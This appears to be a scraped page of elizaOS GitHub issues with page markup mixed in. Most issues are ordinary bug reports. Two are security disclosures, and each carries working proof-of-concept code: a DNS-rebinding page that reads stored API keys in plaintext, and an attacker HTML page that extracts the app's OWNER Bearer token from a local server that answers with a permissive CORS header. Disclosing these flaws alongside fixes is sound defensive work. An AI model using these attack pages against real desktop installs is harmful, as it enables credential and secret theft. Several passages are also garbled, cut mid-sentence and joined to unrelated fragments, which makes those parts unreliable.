gin GET carries **no `Origin` header**, and `Sec-Fetch-Site` is `same-origin` — every loopback-trust condition is satisfied *legitimately*, so the request is authorized as **OWNER with zero credentials**.\n\nResult: any website can read **all GET endpoints** of the agent API, including:\n\n- `GET /api/secrets/inventory` — enumerates every stored secret (key / label / category / lastModified)\n- `GET /api/secrets/inventory/:key` — returns the secret's **current value in plaintext** (verified: `{\"ok\":true,\"value\":\"sk-…\",\"source\":\"bare\"}`) — e.g. LLM provider API keys\n- `GET /api/secrets` — directory with isSet status + masked values (`maskValue`) for cross-checking\n- `/api/agents`, `/api/plugins`, `/api/rooms`, … — all business data\n\n## Environment\n\n- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration\n- Attacker needs any domain that can alternate A records (the free `rbndr.us` service works) and an HTTP server on the **same port as the victim's renderer** (default 5174)\n\n## Root cause\n\n**Renderer proxy strips/rewrites Host** — `packages/app/platforms/electrobun/src/renderer-api-proxy.ts:74-92`:\n\n```ts\nconst HOP_BY_HOP_HEADERS = new Set([\n  \"connection\",\n  \"keep-alive\",\n  \"host\",   // ← the request's Host is dropped, then rewritten to the loopback proxy target\n  ...\n]);\n```\n\n**Agent API: loopback peer = unconditional OWNER** — `packages/agent/src/api/server-helpers-auth.ts:348-364`:\n\n```ts\nif (isTrustedLocalRequest(req)) return true;   // loopback peer → OWNER, no credentials\n```\n\n`isTrustedLocalRequest` (`packages/core/src/security/loopback-trust.ts:374-416`) bases the decision entirely on request properties: loopback TCP peer, no proxy-client-IP headers, loopback `Host`, `Sec-Fetch-Site` ∈ {missing, same-origin, none}, `Origin` absent-or-trusted (`isTrustedLocalOrigin`, :347-360, passes when `Origin` is missing). This correctly blocks **direct** cross-site requests to `:31337` (`Sec-Fetch-Site: cross-site` → 403) — but after a rebind, the browser's request *is* same-origin, so it passes.\n\nThe secrets endpoints are gated on OWNER only — e.g. `packages/app/src/api/secrets-inventory-routes.ts:124` (`ensureRouteMinRole(..., \"OWNER\")`), `packages/agent/src/api/plugin-management-routes.ts:280-291` — and a rebound request **is** OWNER. (Additionally, `packages/agent/src/api/media-runtime.ts:92-115` marks media routes `public: true`.)\n\nAttack chain:\n\n```\nattacker domain (A record → attacker) serves the malicious page\n  → TTL expires, domain resolves to 127.0.0.1 (rbndr.us alternates both IPs, TTL 1s)\n  → page is now same-origin with the renderer (127.0.0.1:5174)\n  → same-origin GET fetch(\"/api/secrets/inventory/\u003ckey\u003e\")\n  → renderer proxy strips Host, forwards → agent API (127.0.0.1:31337)\n  → loopback peer + rewritten Host + GET without Origin → trusted → OWNER\n  → 200 {\"ok\":true,\"value\":\"sk-…\"} — plaintext API key, readable same-origin\n```\n\n## Steps to reproduce\n\n\u003e DNS rebinding requires the attacker page to be served on the **same port** the victim's renderer listens on (default 5174, from any non-loopback IP — a second machine, or another NIC/LAN IP on the same machine).\n\n1. **Attacker side:** save the PoC below as `poc.html` and serve it on port 5174 (`python -m http.server 5174`).\n2. Build the rebinding domain: `7f000001.\u003cattacker-ip-hex\u003e.rbndr.us` — e.g. attacker `192.168.1.10` → hex `c0a8010a` → `7f000001.c0a8010a.rbndr.us` (`7f000001` = 127.0.0.1).\n3. **Victim side:** start the desktop app (default config), browse to `http://7f000001.c0a8010a.rbndr.us:5174/poc.html`, click \"Start\".\n4. The page polls a relative GET every 900 ms (≤90 tries). While DNS points at the attacker it just gets the PoC page back (or 404); once it flips to `127.0.0.1` you get `REBIND HIT`, and the page reads `/api/secrets/inventory`, `/api/secrets/inventory/\u003ckey\u003e` (plaintext), `/api/agents`, `/api/plugins`, `/api/rooms` — all HTTP 200, bodies fully readable (same-origin).\n\nMinimal PoC (any page on the rebinding domain, after the DNS flip):\n\n```js\nconst keys = await (await fetch(\"/api/secrets/inventory\", { cache: \"no-store\" })).json(); // enumerate stored secrets\nconst r = await fetch(\"/api/secrets/inventory/ANTHROPIC_API_KEY\", { cache: \"no-store\" }); // same-origin GET, no Origin header\nconst data = await r.json(); // {\"ok\":true,\"value\":\"sk-…\",\"source\":\"bare\"} — plaintext API key\n```\n\nSelf-contained PoC page:\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003ctitle\u003eattacker rebind page\u003c/title\u003e\u003c/head\u003e\n\u003cbody style=\"background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px\"\u003e\n\u003ch2\u003eElizaOS Desktop — DNS rebinding unauthorized-read PoC (this page is the \"attacker website\")\u003c/h2\u003e\n\u003cp\u003eTarget endpoint:\n\u003cselect id=\"target\"\u003e\n  \u003coption value=\"/api/secrets/inventory/ANTHROPIC_API_KEY\"\u003e/api/secrets/inventory/:key (plaintext API key)\u003c/option\u003e\n  \u003coption value=\"/api/secrets/inventory\"\u003e/api/secrets/inventory (enumerate secrets)\u003c/option\u003e\n  \u003coption value=\"/api/secrets\"\u003e/api/secrets (directory: isSet + masked values)\u003c/option\u003e\n  \u003coption value=\"/api/agents\"\u003e/api/agents\u003c/option\u003e\n  \u003coption value=\"/api/plugins\"\u003e/api/plugins\u003c/option\u003e\n  \u003coption value=\"/api/rooms\"\u003e/api/rooms\u003c/option\u003e\n\u003c/select\u003e\n\u003cbutton onclick=\"rebind()\"\u003eStart DNS rebinding unauthorized read\u003c/button\u003e\u003c/p\u003e\n\u003cpre id=\"log\" style=\"background:#010409;border:1px solid #30363d;padding:12px;min-height:160px\"\u003e\u003c/pre\u003e\n\u003cscript\u003e\nconst log = (m, c) =\u003e {\n  const d = document.createElement('div');\n  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;\n  d.style.color = c || '#c9d1d9';\n  document.getElementById('log').appendChild(d);\n};\nlet scanning = false;\nasync function rebind() {\n  if (scanning) return;\n  if (location.protocol === 'file:') { log('[x] Open this page over http:// via the rbndr domain (file:// cannot rebind)', '#ff7b72'); return; }\n  if (/^(127\\.|localhost|\\[::1\\])/.test(location.hostname))\n    log('[!] Warning: you are on a loopback hostname — a same-origin read is not evidence; use the rbndr domain', '#d29922');\n  const target = document.getElementById('target').value;\n  scanning = true;\n  log('[*] Page origin: ' + location.origin + ' (the domain alternates attacker-IP \u003c-\u003e 127.0.0.1, TTL 1s)', '#8b949e');\n  let hit = false;\n  for (let i = 1; i \u003c= 90 \u0026\u0026 !hit; i++) {\n    try {\n      const r = await fetch(target, { cache: 'no-store', referrerPolicy: 'no-referrer' });\n      const body = await r.text();\n      if (r.status === 200 \u0026\u0026 body.length \u003e 0 \u0026\u0026 !/attacker rebind page/.test(body)) {\n        // response is no longer this PoC itself (the attacker side serves this page) -\u003e rebound to 127.0.0.1\n        hit = true;\n        log('[*] REBIND HIT @ try ' + i + ': ' + target + ' -\u003e HTTP ' + r.status + ' (now same-origin with 127.0.0.1:' + location.port + ')', '#ff7b72');\n        log('[+] First 500 bytes of the response:', '#3fb950');\n        log('    ' + body.slice(0, 500), '#8b949e');\n        if (target.indexOf('/api/secrets/inventory/') === 0 \u0026\u0026 /\"value\"\\s*:/.test(body))\n          log('[*] Plaintext API key read without authorization — ' + body, '#ff7b72');\n        log('[*] Impact: a page on the attacker domain reads agent API GET data as OWNER, with no credentials', '#ff7b72');\n      } else {\n        log('[-] try ' + i + ': HTTP ' + r.status + ' (DNS currently on the attacker side / got the PoC page itself)', '#8b949e');\n      }\n    } catch (e) {\n      log('[-] try ' + i + ': network error (DNS currently on the attacker side, or connection refused)', '#8b949e');\n    }\n    await new Promise(s =\u003e setTimeout(s, 900));\n  }\n  if (!hit) log('[x] No hit in 90 tries. Check: do the attacker server and the victim renderer use the same port (both 5174)? Is the rbndr domain correct?', '#ff7b72');\n  scanning = false;\n}\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Negative control (what already works)\n\n- From an ordinary website: `fetch(\"http://127.0.0.1:5174/api/...\")` → the browser attaches `Sec-Fetch-Site: cross-site` → the agent API returns **403**.\n- Direct request to `:31337` with a stolen Bearer token → **403**.\n- Only the rebinding path succeeds without credentials — the agent API does defend against direct cross-site access; the gap is the **renderer proxy chain**.\n\n## Impact (and honest scope)\n\n- Through this path a browser obtains **read-only OWNER access**: all GET endpoints, including stored secrets in plaintext.\n- **Writes are blocked**: POST/PUT/DELETE from the browser carry `Origin` → 403. No write/RCE from the browser via this issue alone.\n- Plaintext reads only cover secrets the victim has actually stored.\n- Requires an attacker-controlled domain (free `rbndr.us` suffices) and the same port as the renderer (default 5174; if the renderer increments, the attacker port follows).\n- The rebind usually lands within ~10 s of polling (90 × 900 ms window).\n- Chrome LNA, if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.\n\n## Suggested fix\n\n1. **Validate `Host` in the renderer proxy** (`renderer-api-proxy.ts`): only forward requests whose `Host` is the expected loopback host (`127.0.0.1:5174` / `localhost:5174`); reject everything else. This is the standard DNS-rebinding mitigation — during a rebind attack the Host is the attacker's domain.\n2. **Add a shared secret between the renderer proxy and the agent API**, so \"can connect to :5174\" no longer equals OWNER; loopback trust should not rest on forgeable/satisfiable headers alone.\n3. **Never return secret plaintext from `/api/secrets/inventory/:key`** — return masked values or decrypt on explicit request, so even a bypassed OWNER read yields no key material.\n4. Defense in depth: reject non-loopback `Host`/`Origin` outright in the loopback-trust check."])</script><script>self.__next_f.push([1,"1a:T19a3,"])</script><script>self.__next_f.push([1,"## Summary\n\nThe ElizaOS desktop app starts a local **renderer HTTP server** (Electrobun main process, `Bun.serve`, default `127.0.0.1:5174`, incrementing if taken). Two flaws on this server combine:\n\n1. **Every static response is served with `Access-Control-Allow-Origin: *`** — JavaScript on any website can read the response bodies cross-origin.\n2. **The built-in index page embeds the app's boot config in plaintext**, including the agent API's **OWNER-level Bearer token (`apiToken`)** and its base URL (`apiBase`).\n\nSo if the victim simply opens any attacker-controlled web page while the desktop app is running, that page performs one plain cross-origin GET (a simple request, **no preflight**) to `http://127.0.0.1:5174/`, reads the full HTML, and extracts the OWNER token with a regex. Zero interaction, no dialogs, completely silent — the app's highest-privilege credential is handed to an arbitrary website.\n\n## Environment\n\n- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration (no special settings)\n\n## Root cause\n\n`packages/app/platforms/electrobun/src/index.ts` — static-file handling of the renderer server:\n\n```ts\n// index.ts:915-933 — HTML branch\nif (mimeExt === \".html\" || filePath.endsWith(\"index.html\")) {\n    const html = apiBaseOwner.injectIntoHtml(content.toString(\"utf8\"));  // :925 — injects apiToken + apiBase into the page\n    return new Response(html, {\n        headers: {\n            \"Content-Type\": \"text/html; charset=utf-8\",\n            \"Access-Control-Allow-Origin\": \"*\",                           // :929 — any origin may read this\n            \"Cache-Control\": \"public, max-age=0, must-revalidate\",\n        },\n    });\n}\n```\n\n```ts\n// index.ts:934-937 — all other static assets\nconst headers: Record\u003cstring, string\u003e = {\n    \"Content-Type\": getRendererAssetContentType(mimeExt),\n    \"Access-Control-Allow-Origin\": \"*\",                                   // :936\n    ...\n};\n```\n\nEither flaw alone would be harmless (no token embedded → nothing to steal; no `ACAO: *` → body unreadable cross-origin). Together, the OWNER credential leaves the victim's machine into the attacker's page context.\n\n## Steps to reproduce\n\n1. Start the desktop app (default config). The renderer listens on `127.0.0.1:5174`.\n2. Open any other web page (any http/https origin — even `file://` works, which is convenient for verification) and run this from the browser console:\n\n```js\nconst r = await fetch(\"http://127.0.0.1:5174/\", { cache: \"no-store\" });\nconst html = await r.text();\nconsole.log(r.headers.get(\"access-control-allow-origin\")); // \"*\"  (cross-origin read allowed)\nconsole.log(html.match(/apiToken:\"([0-9a-fA-F]+)\"/)[1]);   // the OWNER-level Bearer token\nconsole.log(html.match(/apiBase:\"([^\"]+)\"/)[1]);           // e.g. http://127.0.0.1:31337\n```\n\n3. The console prints the OWNER token.\n\nSelf-contained attacker page (save as `.html`, open in a browser on the victim machine, click the button):\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003ctitle\u003eattacker page\u003c/title\u003e\u003c/head\u003e\n\u003cbody style=\"background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px\"\u003e\n\u003ch2\u003eElizaOS Desktop — cross-origin OWNER token theft PoC (this page is the \"attacker website\")\u003c/h2\u003e\n\u003cp\u003eRenderer port (default 5174): \u003cinput id=\"port\" value=\"5174\" style=\"width:80px\"\u003e\n\u003cbutton onclick=\"steal()\"\u003eSteal OWNER token (cross-origin)\u003c/button\u003e\u003c/p\u003e\n\u003cpre id=\"log\" style=\"background:#010409;border:1px solid #30363d;padding:12px;min-height:120px\"\u003e\u003c/pre\u003e\n\u003cscript\u003e\nconst log = (m, c) =\u003e {\n  const d = document.createElement('div');\n  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;\n  d.style.color = c || '#c9d1d9';\n  document.getElementById('log').appendChild(d);\n};\nasync function steal() {\n  const port = document.getElementById('port').value.trim() || '5174';\n  log('[*] Target: http://127.0.0.1:' + port + '/  (plain GET, no preflight, any origin may send it)', '#8b949e');\n  try {\n    const r = await fetch('http://127.0.0.1:' + port + '/', { cache: 'no-store' });\n    log('[+] HTTP ' + r.status, '#3fb950');\n    const acao = r.headers.get('access-control-allow-origin');\n    log(acao === null ? '[-] No ACAO header (this port may not be the renderer)'\n                      : '[+] Access-Control-Allow-Origin: ' + acao, acao === '*' ? '#ffa657' : '#d29922');\n    const html = await r.text();\n    log('[+] Cross-origin body read succeeded, ' + html.length + ' bytes', '#3fb950');\n    const tk = html.match(/apiToken:\"([0-9a-fA-F]+)\"/);\n    const ab = html.match(/apiBase:\"([^\"]+)\"/);\n    if (tk) log('[+] Stolen OWNER Bearer token: ' + tk[1], '#ffa657');\n    if (ab) log('[+] apiBase: ' + ab[1], '#ffa657');\n    if (tk \u0026\u0026 ab) log('[*] Impact: a malicious website has obtained the agent API OWNER credential with zero interaction', '#ff7b72');\n  } catch (e) {\n    log('[-] Request failed: ' + e.message, '#ff7b72');\n  }\n}\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Expected / actual\n\n- **Expected:** an external origin cannot read the local renderer's responses, and the OWNER token is never exposed to web content.\n- **Actual:** `ACAO: *` lets any origin read the index HTML, which contains the OWNER Bearer token in plaintext.\n\n## Impact (and honest scope)\n\n- The agent API's **OWNER credential itself is exfiltrated** to any website the user visits — zero interaction beyond opening a page.\n- Directly replaying **write** requests (POST/PUT) from the browser with the stolen token is rejected with 403: the agent API's loopback-trust check refuses requests carrying an untrusted `Origin` header (`packages/core/src/security/loopback-trust.ts:347-416`). The damage here is the credential leaving the machine, plus chaining with any local process or other issues — a local process holding this token can call the full API as OWNER.\n- Chrome's Local Network Access (LNA), if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.\n- Not applicable in external/cloud connection mode (no `apiToken` embedded there).\n\n## Suggested fix\n\n1. **Remove `Access-Control-Allow-Origin: *`** from static responses (`index.ts:929`, `index.ts:936`). The desktop UI does not need to be readable by arbitrary web origins.\n2. **Don't embed the long-lived OWNER token in the HTML** (`injectIntoHtml`): deliver it via one-time runtime IPC, or use short-lived per-session credentials bound to the app's own processes.\n3. If the UI must be served over HTTP, put an **Origin allowlist** on the renderer server (app protocol / loopback same-origin only)."])</script><script>self.__next_f.push([1,"1b:T6ee,"])</script><script>self.__next_f.push([1,"### What happens\n\n`buildSelfControlBlockPolicy` in `plugins/plugin-blocker/src/services/website-blocker/engine.ts` only adds a `www.` entry when the requested host has exactly two labels (`shouldAddWwwVariant`, line 1010). It also looks up the per-site policy group by the literal requested host (line 260). As a result the block silently leaves the site reachable in three common cases:\n\n1. **Country-code registrable domains.** Blocking `bbc.co.uk`, `amazon.co.uk` or `abc.net.au` adds no `www.` entry, but these sites serve from `www.`.\n2. **Requests that name the www host.** Blocking `www.example.com` (or a pasted `https://www.example.com/`) never blocks `example.com`.\n3. **www requests for a site with a policy group.** Blocking `www.twitter.com` blocks only that host. The Twitter/X group that a `twitter.com` request gets (x.com, t.co, twimg hosts and others) is skipped, and twitter.com redirects to x.com, so the block has no practical effect.\n\nIn each case the block reports itself as active while the site stays open.\n\n### Repro\n\n```ts\nimport { buildSelfControlBlockPolicy } from \"./engine\";\n\nbuildSelfControlBlockPolicy([\"example.co.uk\"]).blockedWebsites;\n// [\"example.co.uk\"]     (no www.example.co.uk)\n\nbuildSelfControlBlockPolicy([\"www.example.com\"]).blockedWebsites;\n// [\"www.example.com\"]   (no example.com)\n\nbuildSelfControlBlockPolicy([\"www.twitter.com\"]).blockedWebsites;\n// [\"www.twitter.com\"]   (a \"twitter.com\" request yields 13 hosts, including x.com and t.co)\n```\n\n### Expected\n\nA registrable domain and its `www.` host should be treated as one site. Both should be blocked whichever one was named, and the site's policy group should apply. Other subdomains such as `news.example.co.uk` or `sub.example.org` should keep blocking only themselves.\n"])</script><script>self.__next_f.push([1,"1c:T8f0,"])</script><script>self.__next_f.push([1,"## Problem\n\n`AgentRuntime.useModel` checks both a caller-supplied `params.signal` and the owning streaming context's `abortSignal` before and after dispatch, but forwards only the explicit signal to the provider when both exist. Cancelling the turn while a cooperative provider is waiting on a response body therefore leaves the transport running. Runtime cancellation is only noticed after that handler eventually settles.\n\nReproduced against `develop` at `4039228dfdd965354cb61a9da0e26774de21ae02`, through the real runtime and a real local HTTP response body. This is transport/lifecycle evidence with a deterministic registered model handler, not a live LLM call.\n\n## Reproduction\n\n1. Register a `TEXT_LARGE` handler that calls `fetch(url, { signal: params.signal })` and awaits `response.text()`.\n2. Have the local HTTP server flush a partial body and hold the response open.\n3. Call `runtime.useModel` with an explicit caller controller inside `runWithStreamingContext({ abortSignal: turnController.signal }, ...)`.\n4. After the server receives the request, abort only `turnController`.\n\nThe handler's signal remains un-aborted and the pending response is not cancelled. Aborting the explicit caller controller subsequently allows cleanup. Caller-only, turn-only, shared-signal, and pre-aborted controls behave correctly.\n\n## Expected behavior\n\nThe provider transport should observe cancellation from either owner, without mutating the caller's request or aborting the other owner's controller. Cancellation must retain its reason and must not trigger provider fallback.\n\n## Proposed scope\n\nCompose the two distinct signals once at the dispatch boundary and use the same signal for provider parameters, runtime checks, downstream delivery, and embedding validation. Preserve signal identity when there is only one signal or both references are the same. Add real-runtime HTTP regressions and document the cancellation contract; no provider plugin API or dependency changes.\n\nThe new cancellation suite on the unchanged baseline is **1 failed / 6 passed**; after the implementation it is **7 passed**. The existing provider fallback suite also passes (**18 tests combined**). Full package and repository verification are being recorded separately, including any Windows limitations.\n"])</script><script>self.__next_f.push([1,"1d:T58c,"])</script><script>self.__next_f.push([1,"Install the tested release on four phones and verify the demo.\n\n## Detailed Description\n\n**Estimate:** 2 working days. **Needs:** accepted AOSP image, APK/SMS/call integration and offline routine delivery. Nubs owns rollout; Shaw supplies the tested image and rollback instructions.\n\n- Pin the accepted OS, APK and host revisions.\n- Provision four devices with separate identities and pairings.\n- Check cloud voice, SMS, agreed calls and offline-result recovery on every phone.\n- Record per-device results and one complete walkthrough.\n- Provide install, pairing, recovery and rollback instructions.\n\nThis starts after the image and integrations pass. It does not include new hardware bring-up or fleet-management software.\n\n- Close the jointly agreed P0/P1 list and attach per-device acceptance results.\n- Have a client engineer reproduce the build and deployment from delivered source and guides.\n- Nubs records an unedited three-minute demo covering the device experience and end-to-end pairing.\n- Deliver the source, build scripts and device/Alpha deployment guides. Carry final branded-release acceptance into #31034.\n\n**Done when:** all four phones pass the demo and another engineer can provision a device from the handoff.\n\nRun the affected package checks and required repository gates; attach real model/device/AWS evidence where applicable.\n\n[Project and schedule](https://github.com/orgs/elizaOS/projects/20)\n"])</script><script>self.__next_f.push([1,"1e:Ta14,"])</script><script>self.__next_f.push([1,"Run the existing agent on Alpha’s AWS Nitro Enclave.\n\n## Detailed Description\n\n**Estimate:** 4 working days, September 14–17 (deployment, performance verification and attestation). **Needs:** Alpha deployment access and its network/storage adapters. Context optimization is not a blocker.\n\n- Package the working agent deployment for Alpha’s enclave setup.\n- Connect ingress, outbound model/speech requests and durable storage through Alpha’s supported adapters.\n- Use remote text, STT and TTS providers outside the TEE. This is the accepted architecture. Disable local models in this profile.\n- Preserve the agent lf.__next_f.push([1,"1f:T69b,"])</script><script>self.__next_f.push([1,"## Problem\n\nThe shipped `STEER_LIQUIDITY` wallet provider can report unrelated Steer vaults for a token-address query.\n\n`SteerLiquidityService.getTokenLiquidityStats()` treats any vault with a `poolAddress` as a token match, even when neither `token0` nor `token1` equals the requested address. If an address has no direct matches, the same method then falls back to every vault on the selected chain. The provider renders those vaults under `FOUND ... VAULTS` for the requested token, producing materially incorrect wallet analytics.\n\n## Reproduction\n\nInvoke the production service method with a deterministic Steer SDK boundary containing:\n\n- one vault whose `token0` equals `0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\n- one unrelated vault with different `token0`/`token1`\n- a `poolAddress` on both vaults, matching the real SDK shape\n\nCurrent result:\n\n```json\n{\n  \"known\": [\n    \"0x1111111111111111111111111111111111111111\",\n    \"0x2222222222222222222222222222222222222222\"\n  ],\n  \"unknown\": [\n    \"0x1111111111111111111111111111111111111111\",\n    \"0x2222222222222222222222222222222222222222\"\n  ]\n}\n```\n\nThe known address should return only the first vault. The unknown address should return no vaults.\n\n## Acceptance criteria\n\n- Token-address searches include only vaults whose `token0` or `token1` address equals the requested address, case-insensitively.\n- A `poolAddress` alone never proves token membership.\n- An explicit token-address query with no matches returns an empty result instead of falling back to all chain vaults.\n- Symbol/general overview behavior remains unchanged.\n- Regression coverage exercises the public service path for both a matching and an unknown address.\n"])</script><script>self.__next_f.push([1,"20:T4b9,## Problem\n\nThe standalone agent's `CONTACT` action schedules follow-ups as the requested instant, but its success message formats `scheduledAt` with bare `Date#toLocaleString()`. The confirmation therefore uses the host process timezone rather than the owner/calendar timezone.\n\nThis is owner-visible and host-dependent. For `scheduledAt=2026-08-20T23:00:00.000Z` with `TIMEZONE=America/Los_Angeles`:\n\n- `TZ=UTC` reports `Scheduled follow-up with contact for 8/20/2026, 11:00:00 PM.`\n- `TZ=America/New_York` reports `Scheduled follow-up with contact for 8/20/2026, 7:00:00 PM.`\n- The owner-local time is `8/20/2026, 4:00:00 PM`.\n\nThe persisted `scheduledAt` remains the correct ISO instant; only the action result shown to the owner is wrong.\n\n## Location\n\n`packages/agent/src/actions/contact.ts`, `handleFollowup` success text.\n\n## Acceptance criteria\n\n- Resolve the canonical calendar timezone before scheduling the follow-up.\n- Format the owner-visible confirmation in that explicit timezone.\n- Keep the persisted/scheduled ISO instant unchanged.\n- Prove the output is invariant under at least two different host `TZ` values.\n- Ensure timezone-resolution failure occurs before the scheduling side effect.\n21:Tc2f,"])</script><script>self.__next_f.push([1,"## Defect\n\n`disconnectManagedGoogleConnection` (`packages/cloud/shared/src/lib/services/agent-google-connector/shared.ts:547-566`) falls through to `connections[0]` when an **explicit** `connectionId` matches nothing:\n\n```ts\nconst activeConnection =\n  (args.connectionId\n    ? connections.find((connection) =\u003e connection.id === args.connectionId)\n    : getPreferredActiveConnection(connections, args.userId, args.side)) ??\n  connections[0] ??        // \u003c- explicit-but-unknown id lands here\n  null;\n```\n\nA caller who passes a stale, wrong, or cross-side UUID — with otherwise valid authentication — gets **HTTP 200 `{ok:true}`** while a *different* connection (the first in the scoped list) is revoked. The explicit-id contract (\"disconnect THIS one\") silently degrades into \"disconnect whatever is first.\"\n\nThis is the `sha itializedRuntime(\"Router over Cloud\");\nruntime.registerModel(ModelType.TEXT_LARGE, noInference, \"elizaOSCloud\");\ninstallRouterHandler(runtime);\n// CLOUD_MODEL_REGISTRY service reports TEXT_LARGE as model_not_available\nexpect(computeCanRespond(runtime, \"running\", null)).toBe(false); // fails: true\n```\n\n```\n$ cd packages/agent \u0026\u0026 bunx vitest run test/response-readiness-router.test.ts   # develop health-routes.ts\n ❯ test/response-readiness-router.test.ts (6 tests | 2 failed)\n   × does not report a router with no provider behind it as able to respond\n   × gates a Cloud-only runtime behind the router when the catalog lacks the model\nAssertionError: expected true to be false // Object.is equality\nAssertionError: expected true to be false // Object.is equality\n```\n\nWithout the router, the same Cloud-only runtime is gated correctly, which the existing `local-model-readiness-http.test.ts` pins (\"preserves Cloud unknown, explicit unavailable, and fallback-provider behavior\").\n\n**Expected behavior**\n\n- A runtime whose text slots hold nothing but the router reports `canRespond: false`, the same as a runtime with no text handler at all.\n- A runtime with Cloud behind the router is gated by a positive catalog answer that the Cloud model is missing, the same as a Cloud-only runtime without the router.\n- A router over any real provider (local inference, Cloud, OpenAI, Ollama, a custom provider) keeps reporting `canRespond: true`.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - the defect is in the readiness JSON that the composer gate reads; the test transcript above is the proof. The visible effect is a composer that goes live on a host whose first turn then fails.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no rendered surface of its own; see the transcript.\n- [x] Backend logs and frontend console/network logs when relevant: the assertion output above; `useModel` rejects with `NoModelProviderConfiguredError` on the router-only runtime.\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model is invoked; the router rejects before any provider.\n- [x] Domain artifacts when relevant: the registration table of the router-only runtime (`getModelRegistrations()` filtered to `TEXT_LARGE` gives `[\"eliza-router\"]`).\n\n**Additional context**\n\n- `hasTextGenerationHandler` lives in `plugins/plugin-assistant/src/services/message/trajectory-stages.ts:385-397` and uses `runtime.getModel(type)`, which returns the router's handler. The narrowest fix keeps that helper and adds a router-aware registration check in `health-routes.ts`, which already knows the router's provider name.\n- On a device-bridge host, the UI composer currently goes live while the device is still absent. After the fix it stays locked until a device or another provider registers, which matches what a turn would do.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 --\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-fable-5-1`\n\u003c!-- attribution-row:client --\u003e\n- Agent tooling: `Claude Code`\n\u003c!-- attribution-row:skill-revision --\u003e\n- Skill path: `elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza`\n\u003c!-- attribution-row:status --\u003e\n- Provenance status: `self-reported`\n\nAI provider/model: anthropic / claude-fable-5-1\nClient / agent tooling: Claude Code\nContribution skill revision: elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\nAttribution status: self-reported\n— [nxn-claude-code]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"anthropic\",\"model\":\"claude-fable-5-1\",\"client\":\"Claude Code\",\"skill_revision\":\"elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\"} --\u003e\n"])</script><script>self.__next_f.push([1,"2a:T187c,"])</script><script>self.__next_f.push([1,"**Describe the bug**\n\nThree Cloud operator scripts cannot start. Their documented commands stop at module loading, before the script reaches the service it exists to call.\n\n- `packages/cloud/scripts/admin/refund-crypto-payment.ts:43-45` imports `@/lib/services/crypto-payment-refunds`.\n- `packages/cloud/scripts/admin/promote-admin.ts:47` imports `@/lib/services/admin`.\n- `packages/cloud/scripts/admin/set-billing-email.ts:15-16` imports `@/db/client` and `@/db/schemas/organizations`.\n\nThe `@/` alias is a `paths` entry in `packages/cloud/shared/tsconfig.json`. Nothing maps it for `packages/cloud/scripts`: the tooling package (`packages/cloud/scripts/package.json`) has no tsconfig, and neither Bun nor `tsx` resolves the alias from there. Every other script in that directory that needs Cloud code imports it through the `@elizaos/cloud-shared` package exports (`packages/cloud/shared/package.json:10-15`, `./db/*` and `./lib/*`), which the tooling package already declares as a workspace dependency. These three are the only `@/` imports left under `packages/cloud/scripts` (`git grep -n 'from \"@/\\|import(\"@/' packages/cloud/scripts`).\n\nThe refund script is the only runtime caller of `cryptoPaymentRefundsService.refundAsCloudCredits`, so an operator has no working path to the refund flow that #32955 just hardened. This was first noted as a non-blocking finding in the #32955 review.\n\n**To Reproduce**\n\nOn `origin/develop` `27dec7b0c3`, Bun 1.3.14, Node 24.15.0, after `bun install --frozen-lockfile --ignore-scripts`, with `DATABASE_URL` pointing at a PGlite directory migrated by `bun run db:cloud:migrate`. Paths are shortened to the repository root.\n\n```\n$ bun packages/cloud/scripts/admin/refund-crypto-payment.ts 00000000-0000-4000-8000-000000000001 00000000-0000-4000-8000-000000000002 1 refund-ticket-0001 00000000-0 the service's own answer: `CRYPTO_REFUND_PAYMENT_NOT_FOUND`, `No admins found.`, and `Organization not found`.\n\nA test in the tooling package should pin that no script under `packages/cloud/scripts` imports through `@/`, and that the refund and admin-promotion scripts get past module loading.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - command-line operator scripts with no rendered surface. The transcripts above are the proof.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no visible surface; see the transcripts.\n- [x] Backend logs and frontend console/network logs when relevant: the scripts' own stderr is above. N/A for frontend.\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model, prompt or action is involved.\n- [x] Domain artifacts when relevant: the resolver table above shows which specifiers resolve from the scripts' directory.\n\n**Additional context**\n\n- `packages/cloud/scripts/README.md` says operations are invoked through their documented commands. The usage lines of these three scripts are the only documentation of those commands.\n- On a source checkout without built `dist` output, the scripts also need `--conditions=eliza-source` once their own imports resolve, because `@elizaos/core` is reached through `@elizaos/cloud-shared`. The root `db:cloud:migrate` command already passes that flag for this directory; the usage lines of these scripts do not mention it.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 